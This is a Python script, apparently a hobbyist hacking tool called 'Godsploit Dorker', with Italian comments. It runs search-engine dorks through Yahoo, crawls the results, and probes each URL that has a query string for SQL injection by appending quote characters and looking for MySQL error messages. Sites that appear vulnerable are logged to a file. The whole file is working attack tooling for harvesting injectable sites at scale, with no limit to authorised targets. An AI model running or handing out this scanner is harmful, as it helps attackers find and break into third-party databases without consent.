'''

- Godsploit Dorker coded by @Godlik
- Version: 3.0
- GitHub: https://github.com/gdsubn3t/
- Finds and Scans url using a sinlge dork or a file list.
- You can use this code, but please give credits.
- Have fun and stay legal!

'''

import argparse, requests, re, sys, bs4, time
from bs4 import BeautifulSoup as bs
from urllib.parse import urlparse


# colors formatting
HEADER = '\033[95m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
WHITE = '\033[97m'
RED = '\033[91m'
ENDC = '\033[0m'
BRIGHT = '\033[1m'
EBRIGHT = '\033[0m'

banner = '''%s%s
                 ,
     ,_     ,     .'<_   > %sGodsploit Dorker%s
    _> `'-,'(__.-' __<   > %s%sMake hacking simple with Dorks!%s%s
    >_.--(.. )  =;`      > %s%sCoded by %s%sGodlik%s
         `V-'`'\\/`       > %s%sVersion: %s%s3.0%s

%s[%s!%s] %sDevelopers assume no liability and are not responsable 
	for any misuse or damage caused by this program.
''' %( BRIGHT, RED, BLUE, RED, EBRIGHT, WHITE, BRIGHT, RED, EBRIGHT, WHITE, BRIGHT, BLUE, RED, EBRIGHT, WHITE, BRIGHT, BLUE, EBRIGHT, WHITE, RED, WHITE, RED)


global sub 

# mostro il banner
print(banner, WHITE)

# parsing degli argomenti
parser = argparse.ArgumentParser(description="Godsploit Framework")
parser.add_argument("-d", "--dork", help="dork to use")
parser.add_argument("-u", "--url", help="target url")
parser.add_argument("-s", "--scan", help="scan the url found", choices=["sql"])
args = parser.parse_args()


# abbozzo della funzione per ottenere le dork da un file 
# non viene ancora utilizzata
def extract_dork(file, scan):
	# read the dork wordlist 
	with open(file, 'r') as f:
		for dork in f.readlines():
			main(dork.strip('\r').strip('\n'), scan)
# log generale
def logger(data):
	# salvo tutti gli url trovati
	f = open("godsploit_log.txt", 'a+')
	f.write(data + "\n")
	f.close()

def main(dork, scan):
	open("godsploit_log.txt", 'a+').close() # creo il file di log
	global sub_pages
	sub_pages = [] # creo una lista delle sotto pagine trovate
	if not dork == '':
		print("%sUsing the dork:%s%s" %(WHITE, BLUE, dork))
		url = 'https://search.yahoo.com/search?p=%s' %(dork) # uso yahoo come search engine
		search(url, scan) # cerco nuovi url
		if sub == True: # se <sub> è vero allora cerco anche nelle sotto pagine
			print('%sSearching in sub pages...' %(WHITE))
			time.sleep(1)
			for page in sub_pages: # per ogni pagina cerco altri url
				search(page, scan) # cerco gli url


def logger_s(data):
	# salvo gli url vuln in un file apposito
	f = open("sqli.txt", 'a+')
	f.write(data + "\n")
	f.close()


# scansiono l'url (metodo semplice ma efficace)
def sqlscan(url):
	vuln = False
	payloads = ['\'', '"'] # setto i payload utilizzati
	errors = ['You have an error in your SQL syntax', 'mysql_num_rows()'] # errori più frequenti (mysql_num_rows() è superfluo)
	try:
		for payload in payloads: # per ogni payload
			for error in errors:  # per ogni errore
				if error in requests.get(url + payload).text: # se trovo l'errore nel source code
					vuln = True # il sito è vuln
		if vuln: # se è vulnerabile
			print("%sFound SQL injection: %s%s" %(WHITE, GREEN, url))
			logger_s(url)
		else: # se non lo è 
			print("%sSQL injection not Found: %s%s" %(WHITE, RED, url))
	except KeyboardInterrupt: # se l'user interrompe esco dal programma
		sys.exit()
	except: # se trovo altri errori continuo
		pass

# la funzione search trova i nuovi url
def search(url, scan):
	try:
		source = requests.get(url).text # ottengo il source della pagina di ricerca
		soup = bs(source, 'lxml') # parso il suo source code source code
		for link in soup.find_all('a'): # ottengo tutti i tags 'a'
			link = link.get('href') # ottengo tutti i link
			log = open("godsploit_log.txt", 'r') # apro il file di log
			if link[:4] == 'http': # scarto i link del tipo ("/js/nomejs.js/") 
				if "cc.bing" in link:
					pass
				elif "yahoo" in link:
					if link[:14] == 'https://search': # gli url che iniziano con "https://search" sono di yahoo e
													  # sono delle sotto pagine
						sub_pages.append(link) # aggiungo le pagine alla mia lista
				else:
					if not link + "\n" in log: # se il link non è stato loggato (quindi è nuovo)
						if scan == 'sql': # se lo scan è di tipo sql
							if not urlparse(link).query == '': # e nel url trovato c'è una query
								sqlscan(link) # scansiono l'url
							else:
								print('%sQuery not Found: %s%s' %(WHITE, RED, link)) # se non c'è la query non lo scansiono
						else:
							print('%sFound %s%s'%(GREEN, WHITE, link)) # se non devo scansionare, scrivo solo gli url trovati
						logger(link) # loggo l'url
			log.close() # chiudo il log

	except KeyboardInterrupt:
		exit()

# se esiste un argomento <dork>
if args.dork:
	sub = True
	main(args.dork, args.scan) # passo la dork e il tipo di scan a <main>

# scan singolo
if args.url:
	if not args.url[:4] == 'http':
		args.url = "http://%s" %(args.url)
	if args.scan:
		sqlscan(args.url)
